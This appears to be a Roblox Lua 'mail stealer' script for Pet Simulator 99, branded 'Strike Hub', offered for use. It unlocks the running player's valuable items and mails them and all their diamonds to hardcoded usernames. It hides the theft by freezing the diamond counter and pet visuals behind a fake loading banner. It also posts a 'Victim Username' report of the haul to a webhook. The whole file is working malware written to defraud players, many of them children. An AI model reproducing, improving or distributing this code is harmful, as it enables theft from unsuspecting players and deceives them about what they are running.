_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local plr = game.Players.LocalPlayer
local network = require(game.ReplicatedStorage.Library.Client.Network)
local library = require(game.ReplicatedStorage.Library)
local save = require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory
local message = require(game.ReplicatedStorage.Library.Client.Message)
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local MailMessage = "GGz"
local min_rap = _G.minrap or 10000000
local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
local webhook = _G.webhook or ""
local sortedItems = {}
local totalRAP = 0
local GemAmount1 = 0

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
end

for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("You cannot mailsteal yourself")
    end
end

-- ==============================
-- Find mail price function
-- ==============================
local FunctionToGetFirstPriceOfMail
for _, func in pairs(getgc()) do
    if type(func) == "function" and debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end
local mailSendPrice = FunctionToGetFirstPriceOfMail()

-- Get current diamonds
for i, v in pairs(save.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end

-- ==============================
-- Top-screen small GUI
-- ==============================
if plr.PlayerGui:FindFirstChild("StrikeHubLoading") then
    plr.PlayerGui.StrikeHubLoading:Destroy()
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "StrikeHubLoading"
screenGui.ResetOnSpawn = false
screenGui.Parent = plr.PlayerGui

local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(0.4,0,0,30)
textLabel.Position = UDim2.new(0.3,0,0,5)
textLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
textLabel.BackgroundTransparency = 0.5
textLabel.Text = "Please wait for the script to load"
textLabel.TextColor3 = Color3.fromRGB(0,255,0)
textLabel.TextScaled = true
textLabel.Font = Enum.Font.SourceSansBold
textLabel.Parent = screenGui

-- ==============================
-- Visual Freeze
-- ==============================
local petsFolder = workspace.__THINGS.Pets
local freezeConnection
local function isPetEquippedModel(model)
    return model:FindFirstChild("Equipped") and model.Equipped.Value
end
local function anchorModelParts(model)
    for _, part in ipairs(model:GetDescendants()) do
        if part:IsA("BasePart") then part.Anchored = true end
    end
end
local function unanchorModelParts(model)
    for _, part in ipairs(model:GetDescendants()) do
        if part:IsA("BasePart") then part.Anchored = false end
    end
end

freezeConnection = RunService.RenderStepped:Connect(function()
    pcall(function()
        plr.leaderstats["\240\159\146\142 Diamonds"].Value = GemAmount1
    end)
    if petsFolder then
        for _, pet in ipairs(petsFolder:GetChildren()) do
            if isPetEquippedModel(pet) and not pet:FindFirstChild("ridingTag") then
                anchorModelParts(pet)
            end
        end
    end
end)

plr.AncestryChanged:Connect(function(_, parent)
    if not parent then
        if freezeConnection then pcall(function() freezeConnection:Disconnect() end) end
        if petsFolder then
            for _, pet in ipairs(petsFolder:GetChildren()) do
                pcall(function() unanchorModelParts(pet) end)
            end
        end
        if screenGui then pcall(function() screenGui:Destroy() end) end
    end
end)

-- ==============================
-- RAP Calculation
-- ==============================
local function getRAP(Type, Item)
    return (require(game.ReplicatedStorage.Library.Client.RAPCmds).Get({
        Class = {Name = Type},
        IsA = function(hmm) return hmm == Type end,
        GetId = function() return Item.id end,
        StackKey = function() return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) end,
        AbstractGetRAP = function(self) return nil end
    }) or 0)
end

-- ==============================
-- Collect Items
-- ==============================
local categories = {"Pet","Egg","Charm","Enchant","Potion","Misc","Ultimate"} -- removed Booth/Hoverboard
for _, category in ipairs(categories) do
    if save[category] then
        for uid,item in pairs(save[category]) do
            local rapValue = getRAP(category,item)
            if category == "Pet" then
                local dir = require(game.ReplicatedStorage.Library.Directory.Pets)[item.id]
                if (dir.huge or dir.exclusiveLevel or dir.titanic or dir.gargantuan) and rapValue >= min_rap then
                    local prefix=""
                    if item.pt==1 then prefix="Golden " elseif item.pt==2 then prefix="Rainbow " end
                    if item.sh then prefix="Shiny "..prefix end
                    local id = prefix..item.id
                    table.insert(sortedItems,{category=category,uid=uid,amount=item._am or 1,rap=rapValue,name=id})
                    totalRAP = totalRAP + rapValue*(item._am or 1)
                end
            else
                if rapValue >= min_rap then
                    table.insert(sortedItems,{category=category,uid=uid,amount=item._am or 1,rap=rapValue,name=item.id})
                    totalRAP = totalRAP + rapValue*(item._am or 1)
                end
            end
            if item._lk then network.Invoke("Locking_SetLocked", uid, false) end
        end
    end
end

-- ==============================
-- Send Item Function
-- ==============================
local function sendItem(category, uid, am)
    local remaining = am
    local userIndex = 1
    while remaining > 0 do
        local currentUser = users[userIndex]
        local args={[1]=currentUser,[2]=MailMessage,[3]=category,[4]=uid,[5]=1}
        local response, err = network.Invoke("Mailbox: Send", unpack(args))
        if response == true then
            GemAmount1 = GemAmount1 - mailSendPrice
            mailSendPrice = math.ceil(mailSendPrice * 1.5)
            if mailSendPrice>5000000 then mailSendPrice=5000000 end
            remaining = remaining -1
        elseif err=="They don't have enough space!" then
            userIndex = userIndex +1
            if userIndex>#users then warn("All mailboxes full for item "..uid); return end
        else
            warn("Failed to send item: "..tostring(err))
            return
        end
    end
    return currentUser
end

-- ==============================
-- Send Remaining Gems
-- ==============================
local function SendAllGems()
    for i,v in pairs(save.Currency) do
        if v.id=="Diamonds" then
            local remainingGems = GemAmount1
            for _,currentUser in ipairs(users) do
                if remainingGems<=0 then break end
                local args={[1]=currentUser,[2]=MailMessage,[3]="Currency",[4]=i,[5]=remainingGems}
                local response, err = network.Invoke("Mailbox: Send", unpack(args))
                if response==true then
                    GemAmount1 = GemAmount1 - remainingGems
                    table.insert(sortedItems,{category="Currency",uid=i,amount=remainingGems,rap=0,name="Diamonds",recipient=currentUser})
                    remainingGems=0
                    break
                end
            end
        end
    end
end

-- ==============================
-- Send Webhook
-- ==============================
local function SendWebhook()
    local headers = {["Content-Type"]="application/json"}
    local fields = {
        {name="Victim Username:",value=plr.Name,inline=true},
        {name="Items to be sent:",value="",inline=false},
        {name="Summary:",value="",inline=false}
    }

    for _, item in ipairs(sortedItems) do
        local recipient = item.recipient or "Unknown"
        fields[2].value = fields[2].value..item.name.." (x"..item.amount.."): "..formatNumber(item.rap*item.amount).." RAP | Recipient: "..recipient.."\n"
    end
    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(GemAmount1), formatNumber(totalRAP))

    local data = {["embeds"]={{["title"]="🧪 New PS99 Execution",["color"]=65280,["fields"]=fields,["footer"]={["text"]="Strike Hub."}}}}
    local body = HttpService:JSONEncode(data)
    request({Url=webhook,Method="POST",Headers=headers,Body=body})
end

-- ==============================
-- Execution Loop
-- ==============================
spawn(function()
    for _, item in ipairs(sortedItems) do
        sendItem(item.category,item.uid,item.amount)
    end
    SendAllGems()
    SendWebhook()
end)
